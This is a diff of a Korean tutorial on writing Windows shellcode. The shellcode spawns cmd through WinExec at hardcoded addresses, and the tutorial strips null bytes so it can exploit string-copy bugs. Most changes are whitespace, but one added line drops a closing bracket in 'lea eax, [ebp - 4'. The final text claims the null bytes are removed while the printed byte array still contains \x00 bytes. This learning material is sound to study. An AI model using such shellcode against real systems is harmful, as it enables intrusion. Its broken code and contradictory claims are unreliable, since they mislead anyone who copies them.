@@ -36,23 +36,25 @@ int _tmain(int argc, TCHAR* argv[])
 ```c
 asm {
 	// cmd
-	mov		byte ptr[ebp - 4], 63h  // 'c'
-	mov		byte ptr[ebp - 3], 6Dh  // 'm'
-	mov		byte ptr[ebp - 2], 64h  // 'd'
-	mov		byte ptr[ebp - 1], 0    // '₩x0'
+	mov  byte ptr[ebp - 4], 63h  // 'c'
+	mov  byte ptr[ebp - 3], 6Dh  // 'm'
+	mov  byte ptr[ebp - 2], 64h  // 'd'
+	mov  byte ptr[ebp - 1], 0    // '₩x0'
 	// call WindExec('cmd', SW_SHOW)
-	push	5                       // SW_SHOW
-	lea		eax, [ebp - 4]          // eax에 'cmd' 문자열 저장
-	push	eax                     // 스택에 'cmd' 문자열 주소 push
-	mov		eax, 0x76b32b00         // eax에 WinExec 함수 주소 저장
-	call	eax                     // WinExec 함수 실행
+	push 5                   // SW_SHOW
+	lea  eax, [ebp - 4       // eax에 'cmd' 문자열 저장
+	push eax                 // 스택에 'cmd' 문자열 주소 push
+	mov  eax, 0x76b32b00     // eax에 WinExec 함수 주소 저장
+	call eax                 // WinExec 함수 실행
 	// call ExitProcess(1)
-	push	1
-	mov		eax, 0x76af3cb0
-	call	eax
+	push 1
+	mov  eax, 0x76af3cb0
+	call eax
 };
 ```
-> WinExec() 함수 부분을 보면, 인자값 2개를 역순으로 스택에 PUSH한 뒤, 함수 주소를 CALL 명령으로 호출한다. 저기서 0x76b32b00라는 함수 주소는 간단한 스크립트로 가져올 수 있다. 함수의 주소값은 DLL이 로드되는 주소에 따라 달라지며, 윈도우에서 부팅할 때마다 kernel32.dll이 로드되는 주소가 바뀐다. 그래서, 현재 시스템에서 직접 주소값을 꼭 확인하자.
+> WinExec() 함수 부분을 보면, 인자값 2개를 역순으로 스택에 PUSH한 뒤, 함수 주소를 CALL 명령으로 호출한다. 저기서 0x76b32b00라는 함수 주소는 간단한 스크립트로 가져올 수 있다.
+
+> 함수의 주소값은 DLL이 로드되는 주소에 따라 달라지며, 윈도우에서 부팅할 때마다 kernel32.dll이 로드되는 주소가 바뀐다. 그래서, 현재 시스템에서 직접 주소값을 꼭 확인하자.
 
 위 예제 `shellcode_cmd.cpp`와 `shellcode_cmd2.cpp` 둘 다 컴파일 후 실행하면 같은 cmd 명령이 실행된다. 하지만, 쉘코드 중간에 널바이트인 0x00이 들어가 있어서 C언어 문자열 복사 계열 함수에서 발생하는 취약점에 사용할 수 없다. 공격할 때, 쉘코드가 모두 복사되지 않고 중간에 끊어지면 공격에 실패하므로 공격의 안정성을 위해 널바이트를 제거하자.
 
@@ -66,22 +68,22 @@ asm {
 ```c
 asm {
 		// cmd
-		xor		ebx, ebx
-		mov		[ebp-4], ebx
-		mov		byte ptr[ebp - 4], 63h
-		mov		byte ptr[ebp - 3], 6Dh
-		mov		byte ptr[ebp - 2], 64h
-		//mov		byte ptr[ebp - 1], 0
+		xor   ebx, ebx
+		mov   [ebp-4], ebx
+		mov   byte ptr[ebp - 4], 63h
+		mov   byte ptr[ebp - 3], 6Dh
+		mov   byte ptr[ebp - 2], 64h
+		//mov byte ptr[ebp - 1], 0
 		// call WindExec('cmd', SW_SHOW)
-		push	5
-		lea		eax, [ebp - 4]
-		push	eax
-		mov		eax, 0x76b32b00
-		call	eax
+		push  5
+		lea   eax, [ebp - 4]
+		push  eax
+		mov   eax, 0x76b32b00
+		call  eax
 		// call ExitProcess(1)
-		push	1
-		mov		eax, 0x76af3cb0
-		call	eax
+		push  1
+		mov   eax, 0x76af3cb0
+		call  eax
 	};
 ```
 > XOR을 통해 ebx 레지스터를 0으로 초기화하고, ebx 레지스터를 ebp-4의 주소에 넣어줘서 기존의 `mov byte ptr[ebp-1], 0` 코드를 대체할 수 있다.
@@ -93,24 +95,24 @@ asm {
 #include "windows.h"
 
 char shellcode[] = "\xc6\x45\xfc\x63"
-				           "\xc6\x45\xfd\x6d"
-				           "\xc6\x45\xfe\x64"
-				           "\xc6\x45\xff\x00"
-				           "\x6a\x05"
-				           "\x8d\x45\xfc"
-				           "\x50"
-				           "\xb8\x00\x2b\xb3\x76"
-				           "\xff\xd0"
-				           "\x6a\x01"
-				           "\xb8\xb0\x3c\xaf\x76"
-				           "\xff\xd0";
+                   "\xc6\x45\xfd\x6d"
+                   "\xc6\x45\xfe\x64"
+                   "\xc6\x45\xff\x00"
+                   "\x6a\x05"
+                   "\x8d\x45\xfc"
+                   "\x50"
+                   "\xb8\x00\x2b\xb3\x76"
+                   "\xff\xd0"
+                   "\x6a\x01"
+                   "\xb8\xb0\x3c\xaf\x76"
+                   "\xff\xd0";
 
 int _tmain(int argc, TCHAR* argv[])
 {
-	int * shell = (int*)shellcode;
-	asm {
-		jmp shell;
-	}
+  int * shell = (int*)shellcode;
+  asm {
+    jmp shell;
+  }
 }
 ```
 > 쉘코드에 널바이트가 없어진 걸 확인할 수 있다. 컴파일 후 실행하면 동일한 cmd 명령이 실행된다.
